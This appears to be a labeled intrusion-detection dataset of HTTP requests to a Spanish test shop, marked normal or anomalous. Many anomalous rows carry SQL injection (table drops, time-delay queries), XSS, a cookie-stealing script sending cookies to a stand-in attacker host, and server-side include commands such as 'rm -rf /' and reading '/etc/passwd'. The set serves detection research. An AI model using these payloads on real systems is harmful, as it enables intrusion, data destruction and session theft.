http :  /  / localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 1199 & b1 = pasar + por + caja,0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = hutt & password = 6s19r9u13o & nombre = antú & apellidos = laris + ull & email =  < script > alert (  "" paros ""  )  ;  <  / script >  & dni = 28809888l & direccion = cami + la + parra + 73 +  & ciudad = sella & cp = 39587 & provincia = madrid & ntc = 5101738813776143 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = merlina & password = l12o3o & nombre = heloisa & apellidos = senini & email = odea - chua @ prestigecars . de & dni = 1775107 ' h & direccion = passatge + amerigo ,  + 164 ,  +  & ciudad = valdeltormo & cp = 46175 & provincia = zamora & ntc = 4467025067468073 & b1 = registrar",1
http :  /  / localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = geneviev & pwd = zori0a & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = sawyers & password = encumb2ad3 '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  '  %  & nombre = max & apellidos = sjöstrand + ampurias & email = tamburi @ hispadis . ar & dni = 30293636z & direccion = c /  + virgen + de + las + angustias + 122 + 4 ? a & ciudad = fuentespina & cp = 48220 & provincia = asturias & ntc = 8898020239162472 & b1 = registrar,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombrea = jamón + ibérico & precio = 85 & cantidad = 34 & b1 = añadir + al + carrito,1
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 218 & b1 = pasar + por + caja,0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = rorie & password = des1m7rt3zar & nombre = dannae & apellidos = pujolar & email = fajardo _ aoki @ icods . edu & dni = 67474361c & direccion = paseo + recaredo + 40 ,  + 3 - h & ciudad = hérmedes + de + cerrato & cp = 25721 & provincia = paros ""  + style =  "" background : url ( javascript : alert (  ' paros '  )  )  & id = 2 & ntc = 8072420100013929 & b1 = registrar",1
localhost : 8080 / tienda1 / miembros / imagenes / castro . jpg / ,1
http :  /  / localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = tooley & password = human!amente & nombre = carina & apellidos = isach + deffendini & email = victory @ lalectura . ao & dni = 24389402h & direccion = calle + salamina + 69 + 13 - f & ciudad = avilés & cp = 46190 & provincia = barcelona & ntc = 9319505461670365 & b1 = registrar,0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = dower & password = cu / li / to & nombre = yasmín & apellidos = zincker + selman & email = bednarski @ hipermadrid . tt & dni = 63610677z & direccion = moli + del + comte + 6 ,  + 5 ? b & ciudad = ocentejo & cp = 17869 & provincia = málaga & ntc = 3073564604327179 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = lenka & password = 096r13 . a & nombre = daher & apellidos = de + la + ossa & email = heathcock @ catanoticias . ai & dni = 30598769y & direccion = avinguda + josep + tarradellas ,  + 146 + 11 ? h & ciudada = asparrena & cp = 09614 & provincia = salamanca & ntc = 9256871271036534 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modoa = entrar & login = barrio & pwd = ja3886l7 & remember = on & b1 = entrar,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = onyshko & password = r8sp3ct6v4 & nombre = safira & apellidos = pelegay + martinho & email = brisbane @ drae2 . at & dnia = 89692486f & direccion = c /  + baladre + 195 ,  + 10 - c & ciudad = zamayón & cp = 22415 & provincia = las + palmas & ntc = 4857920544349318 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre =  '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & precio = 85 & cantidad = 78 & b1 = añadir + al + carrito",1
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 4780 & b1 = pasar + por + caja,0
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = tat7 & password = p0on57cia008nto & nombre = camelia & apellidos = zurita + santander & email = diessl - claver @ tradedeficit . mz & dni = 59059811c & direccion = artes ,  + s / n +  & ciudad = escobar + de + polendos & cp = 18518 & provincia = burgos & ntc = 2636619315022095 & b1 = registrar ""  >  < ! -  -  # exec + cmd =  "" dir +  ""  -  -  >  < ",1
"http :  /  / localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = desoer & password = 7i6érrima & nombre = yustine & apellidos = oliveras + grabulós & email = raimu @ ubikuo . jp & dni = 56339714h & direccion = plazoleta + mago + 91 ,  +  & ciudad = tudela + de + duero & cp = 50710 & provincia = ávila & ntc = 7418126861301846 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 5305 & b1 = anyset - cookie :  + tamper = 1041264011025374727,1
"http :  /  / localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = niels & password = compradiza & nombre = galileo & apellidos = ubeda + mercader & email = muscat @ deportechino . af & dni = 74404749w & direccion = enric + prat + de + la + riba ,  + 135 ,  + 2 ? f & ciudad = olula + de + castro & cp = 34407 & provincia = palencia & ntc = 6620935380391144 & b1 = registrar",0
localhost : 8080 / samples / isapi / drop . htm,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = vino + rioja & precio = 39 & cantidad = 4 & b1 = sessionid = 12312312 &  + username =  < script > document . location =  ' http :  /  / hacker +  . example . com / cgi - bin / cookiesteal . cgi ?  '  +  + document . cookie <  / script > ,1
localhost : 8080 / 4861362529278789730 . old,1
"localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 1979 & b1 = paros ""  style =  "" background : url ( javascript : alert (  ' paros '  )  ) ",1
"http :  /  / localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = aube & password = coho5b617 & nombre = manel & apellidos = feixa + urgell & email = jarett @ salsaspain . eg & dni = 07434331h & direccion = berrocala ,  + 151 ,  +  & ciudad = renedo + de + esgueva & cp = 16760 & provincia = zamora & ntc = 8543941291101641 & b1 = registrar",0
"http :  /  / localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = monteiro & password = indeficiente & nombre = teranciano & apellidos = flores + dayekh & email = newcomb @ fbi - criminal - network . com . ba & dni = 39910583v & direccion = calle + candil ,  + 38 + 7 ? b & ciudad = marchamalo & cp = 37799 & provincia = zaragoza & ntc = 9926995556034564 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = heinonen & pwd =  '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & remember = on & b1 = entrar",1
"http :  /  / localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = nyre & password = ma7ordoma & nombre = olidia & apellidos = gómez + viroles & email = godfrey - pughe @ magichobby . nf & dni = 98150433a & direccion = carretera + de + serin + 196 ,  +  & ciudad = granollers & cp = 37260 & provincia = cáceres & ntc = 7434846807193108 & b1 = registrar",0
http :  /  / localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = pubs & password = menorquina & nombre = ivanna & apellidos = fontella + febo & email = toubus _ odriscoll @ granbretana . com . mg & dni = 98027307l & direccion = c /  + sant + adria + s / n + 5 - g & ciudad = sant + antoni + de + portmany & cp = 47210 & provincia = girona & ntc = 4593390363990621 & b1 = registrar,0
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 5786 & b1 = confirmar,0
http :  /  / localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = vino + rioja & precio = 100 & cantidad = 7 & b1 = añadir + al + carrito,0
http :  /  / localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = vino + rioja & precio = 100 & cantidad = 79 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 4373 & b1 = pasar + por + cajaand + 1 = 1,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precioa = 9805 & b1 = pasar + por + caja,1
"http :  /  / localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = elin & password = encornada & nombre = alhuen & apellidos = aja + pericas & email = phillips @ premiostv . rw & dni = 32535546e & direccion = riu + ebre ,  + s / n ,  + 4 ? g & ciudad = búger & cp = 24206 & provincia = zaragoza & ntc = 3746503388770740 & b1 = registrar",0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = jenni & password = ps + i8ológico & nombre = daisi & apellidos = saavedra + aldeta & email = erbd . matache @ elsentidodelavida . vg & dni = 53897959n & direccion = travesa + de + teo + 155 +  & ciudad = villanúa & cp = 50213 & provincia = castellón '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & ntc = 5918980753529049 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = ques + o + manchego & precio = 39 & cantidad = 12 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = lysinger & password = d9sor9an21a2or & nombre = giovana & apellidos = planelles + neris & email =  @ hav @  @ oc @ librodeapuntes . cn & dni = 54498003d & direccion = c /  + fuensanta + 41 +  & ciudad = sangarrén & cp = 32650 & provincia = huesca & ntc = 5070328292613697 & b1 = registrar,1
"localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertarparos ""  + style =  "" background : url ( javascript : alert (  ' paros '  )  )  & id = 2 & precio = 8145 & b1 = confirmar",1
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 6915 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / imagenes /  . java,1
localhost : 8080 / tienda1 / publico / entrar . jsp / asf - logo - wide . gif /  . inc,1
http :  /  / localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = jamón + ibérico & precio = 100 & cantidad = 66 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 7884 & b1 = confirmar / ,1
"http :  /  / localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = blatherw0 & password = butrón & nombre = sila & apellidos = grau & email = rekert - ring @ ustream . co & dni = 15517256f & direccion = calle + infante + alfonso + de + borbon + y + borbon ,  + 104 ,  + 1 - e & ciudad = soria & cp = 18659 & provincia = a + coruña & ntc = 1023064024469079 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = ha * rmony & pwd = zarram $ plín & remember = on & b1 = entrar,1
http :  /  / localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = akim & password = plastic0dad & nombre = jonathan & apellidos = brotons + curimanya & email = reuters . linow @ enandorra . com . uy & dni = 17301472k & direccion = san + gabriel + 155 +  & ciudad = ondarroa & cp = 43360 & provincia = salamanca & ntc = 5088681295774264 & b1 = registrar,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 6458 & b1 = confirmar / ,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = ofilia & password = santurrón & nombre = lauran & apellidos = tonk + carrizales & email = engel @ longboarders . cu & dni = 17b088362y & direccion = plza .  + juan + zorrilla ,  + 107 + 9 ? f & ciudad = bruc ,  + el & cp = 28522 & provincia = granada & ntc = 1816581279872417 & b1 = registrar",1
"http :  /  / localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = shoshana & password = frang . ir & nombre = cuniberto & apellidos = dadah + sanromán & email = vasova @ filtraciondehumos . us & dni = 99063472b & direccion = calle + rio + nervion + s / n ,  +  & ciudad = castellfollit + del + boix & cp = 01928 & provincia = la + rioja & ntc = 8955485707333178 & b1 = registrar",0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & logina = erdem & password = verd7ma3 & nombre = zinedine & apellidos = terzano + reverté & email = dymon @ cursosenlaplaya . lk & dni = 58018464k & direccion = c /  + alondra ,  + 134 ,  + 10 ? c & ciudad = puértolas & cp = 33070 & provincia = guadalajara & ntc = 4378749164701036 & b1 = registrar",1
"http :  /  / localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = poff & password = enromar & nombre = eleodoro & apellidos = zarate + peix & email = nightingale @ escuelamontessori . pl & dni = 56995002j & direccion = antonio + muñoz + molina ,  + 154 ,  +  & ciudad = cacín & cp = 09345 & provincia = burgos & ntc = 0375138068848353 & b1 = registrar",0
"http :  /  / localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = d . amour4 & password = rongiga39 & nombre = hermelinda & apellidos = maslo + arrunategui & email = sympson _ potokar @ x2 . com . qa & dni = 29368063f & direccion = ara ,  + 111 +  & ciudad = campo + de + criptana & cp = 14413 & provincia = navarra & ntc = 9895940721818753 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login =  ?  + maccon / ai & pwd = h4 _ bi651a2 & remember = on & b1 = entrar,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo =  ' or ' a =  ' a & login = tandi & password = a3oari1 & nombre = ezra & apellidos = penagos + pijoan & email = getchell - benning @ aspirantes . ax & dni = 65278169y & direccion = calle + torroja ,  + 3 +  & ciudad = seu + d ' urgell ,  + la & cp = 37881 & provincia = cantabria & ntc = 9898970916283708 & b1 = registrar",1
"http :  /  / localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = blatherw0 & password = vallejuelo & nombre = abinahil & apellidos = sixtos + llabot & email = pearson . lesley @ webhut . br & dni = 42293325m & direccion = calle + barrio + de + la + braña + 136 + 7 - e & ciudad = pobla + de + benifassà ,  + la & cp = 49541 & provincia = málaga & ntc = 1260473774275985 & b1 = registrar",0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = hofstett & password = furtivo & nombre = bartolomea & apellidos = villalón & email = horeth @ twinjet . al & dni = 19895681z & direccion = santa + maria + de + mazzarello + 185 ,  +  & ciudad = cabañas + de + la + sagra & cp = 17770 & provincia = tarragona & ntc = sessionid = 12312312 &  + username =  < script > document . location =  ' http :  /  / hacker +  . example . com / cgi - bin / cookiesteal . cgi ?  '  +  + document . cookie <  / script >  & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = calmenso & pwd = 1ece57al & remember = off /  & b1 = entrar,1
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 9734 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = von _ ende6 & password = 2er9rqu5a & nombre = helda & apellidos = nebot + curell & email = vadis @ clubdegolf . com . gf & dni = 05120273jany ? set - cookie :  + tamper = 1041264011025374727 & direccion = c /  + guardia + civil + 181 + 10 ? e & ciudad = albalá & cp = 42107 & provincia = guadalajara & ntc = 6734713412721708 & b1 = registrar,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 4011 & b1 = confirmar / ,1
localhost : 8080 / iissamples / exair / funngames / funngames . asp,1
"localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = jamón + ibérico '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & precio = 100 & cantidad = 28 & b1 = añadir + al + carrito",1
localhost : 8080 / tienda1 / 6909030637832563290 . jsp . inc,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = ques + o + manchego & precio = 85 & cantidad = 95 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = vino + rioja +  & precio = 39 & cantidad = 82 & b1 = añadir + al + carrito,1
"http :  /  / localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = baominh & password = 2a!l01t6ra & nombre = zoraida & apellidos = gumbau + llave & email = coleman9 @ monnal . ck & dni = 20589861p & direccion = calle + caño + grande + s / n ,  + 5 ? b & ciudad = abajas & cp = 10191 & provincia = zaragoza & ntc = 6169270584542150 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 4506 & b1a = pasar + por + caja,1
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 1032 & b1 = confirmar,0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = yokono5 & pwd = !ent / rep96ad8 & remember = off & b1 = entrar,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = yezi & pwd = adestría & remember = off /  & b1 = entrar,1
http :  /  / localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = shixian & pwd = plant!illa & remember = on & b1 = entrar,0
http :  /  / localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = vino + rioja & precio = 100 & cantidad = 91 & b1 = añadir + al + carrito,0
"http :  /  / localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = joshi & password = hortaliza & nombre = aberardo & apellidos = araoz + recorda & email = wiles @ benadressa . cc & dni = 74356044b & direccion = pasaje + navarro ,  + 28 + 13 ? e & ciudad = salvador + de + zapardiel & cp = 17843 & provincia = cáceres & ntc = 3610612400416764 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = jamón + ibérico & precio = 39 /  & cantidad = 66 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = daugavie9 & password = descerrajar & nombre = rayen & apellidos = gor / rí * n & email = klevenow @ yiutuve . org & dni = 02007726x & direccion = portal + del + rey + 20 + 10 - h & ciudad = aliaga & cp = 06458 & provincia = guipúzcoa & ntc = 9898547003601125 & b1 = registrar,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = munaz & password = s2ld54i5a & nombre = zulma & apellidos = llombart & email = strimpell @ deuxmanagement . sn & dni = a0745780m & direccion = sofia ,  + 60 ,  + 3 ? b & ciudad = finestrat & cp = 01427 & provincia = granada & ntc = 3222655347075896 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = amm * a * mari & password = ch07ico3o & nombre = jeremías & apellidos = maslo + arrunategui & email = ratcliff @ mataroweb . gw & dni = 26853011m & direccion = calle + felipe + de + diego + 191 ,  + 2h & ciudad = montefrío & cp = 36520 & provincia = burgos & ntc = 3246825984475356 & b1 = registrar",1
localhost : 8080 / tienda1 / miembros / imagenes / asf - logo - wide . gif . inc,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = plsntp1 & password = c!uartilludo & nombre = generosa & apellidos = obrador + scolari & email = metanee4 @ martosfutbolsala . us & dni = 55023331v & direccion = cuesta + de + la + independencia + 107 + 7 ? h & ciudad = bastida ,  + la & cp = 50268 & provincia = guadalajara & ntc = 7559315491846404sessionid = 12312312 &  + username =  < script > document . location =  ' http :  /  / hacker +  . example . com / cgi - bin / cookiesteal . cgi ?  '  +  + document . cookie <  / script >  & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 90 & b1 = confirmar / ,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = shutterb & password = 4ntorchar & nombre = noam & apellidos = samper + folco & email = menant @ venderfotografias . se & dni = 33151406b & direccion = calle + aladierna ,  + 85 + 3 ? a & ciudad = burujón & cp = 28648 & provincia = barcel ? ona & ntc = 1260473774275985 & b1 = registrar",1
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 381 & b1 = pasar + por + caja,0
"http :  /  / localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = wakako & password = milamores & nombre = river & apellidos = ulloa + morlé & email = cowell _ vazzoler @ streaptease . pr & dni = 89154256t & direccion = c /  + riu + onyar + 65 ,  + 12 ? b & ciudad = cascajares + de + la + sierra & cp = 33954 & provincia = burgos & ntc = 3892375017170187 & b1 = registrar",0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = ailbert & password = complacedera & nombre = jano & apellidos = ucañay & email = leroy9 @ zarahealth . pa & dni =  < script > alert (  "" paros ""  )  ;  <  / script >  & direccion = calle + kenya + 133 +  & ciudad = chiclana + de + segura & cp = 18230 & provincia = ourense & ntc = 6201867056010966 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = nitin & password = r4mitir & nombre = lionel & apellidos = teixidor + modrego & email = creach @ vindexexpo . gr & dni = 37118814b & direccion = c /  + joaquin + arjona + 70 ,  +  & ciudad = rionegro + del + puente & cp = 49639 & provincia = barcelona & ntc =  < ! -  -  # exec + cmd =  "" rm +  - rf +  /  ; cat +  / etc / passwd ""  +  -  -  >  & b1 = registrar",1
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 7362 & b1 = confirmar,0
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 /  & nombre = jamón + ibérico & precio = 100 & cantidad = 76 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 2796 & b1 = pasar + por + caja / ,1
http :  /  / localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = wolfy & pwd = saltaojos & remember = off & b1 = entrar,0
http :  /  / localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = vino + rioja & precio = 39 & cantidad = 22 & b1 = añadir + al + carrito,0
http :  /  / localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = crain & pwd = acornado & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precioa = 1980 & b1 = confirmar,1
"http :  /  / localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = vern & password = cafetalista & nombre = saray & apellidos = aybar + bouffanais & email = gurchenko1 @ englishiseasy . ee & dni = 96618565g & direccion = casas + montoro ,  + 31 + 7 - h & ciudad = santa + maria + de + besora & cp = 33810 & provincia = segovia & ntc = 3489719668476702 & b1 = registrar",0
localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = saladna & password =  '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & nombre = amranto & apellidos = enjuanes + corbi & email = tin @ velazquezlarrañaga . aw & dni = 09894897k & direccion = c /  + 358 + 180 + 13 ? g & ciudad = sanlúcar + de + barrameda & cp = 16118 & provincia = cuenca & ntc = 1923588691952780 & b1 = registrar,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = belohoub & password = a4alí4st0c8 & nombre = zeeb & apellidosa = monroy + fol & email = anka . mayll @ botilleria . com . ci & dni = 11210100s & direccion = c /  + gonzalez + abarca ,  + 25 + 4 ? f & ciudad = barrios ,  + los & cp = 45522 & provincia = huesca & ntc = 9102908673442206 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 7988 '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & b1 = confirmar",1
"http :  /  / localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = sho & password = herru495o02 & nombre = natal & apellidos = comas + ceñal & email = trout _ cutell @ intercambioenlaces . mu & dni = 23485919k & direccion = c /  + fedra ,  + 69 ,  + 1 ? e & ciudad = salvatierra + de + los + barros & cp = 30412 & provincia = girona & ntc = 2591002253135284 & b1 = registrar",0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = pic & password = emba ? ulada & nombre = cruz & apellidos = puyal + catalan & email = eastside - luco @ apicultor . ms & dni = 39658514m & direccion = c /  + don + juan + de + aguilar + 168 ,  +  & ciudad = nava ,  + la & cp = 31284 & provincia = león & ntca = 6217533099373869 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = shonuck & password = b ,  / esu , cóna & nombre = hortencia & apellidos = mañé + moscoso & email = valadez @ gaudio . bj & dni = 81703579n & direccion = poligono + amargacena + 141 +  & ciudad = hita & cp = 06658 & provincia = barcelona & ntc = 7343251905864691 & b1 = registrar",1
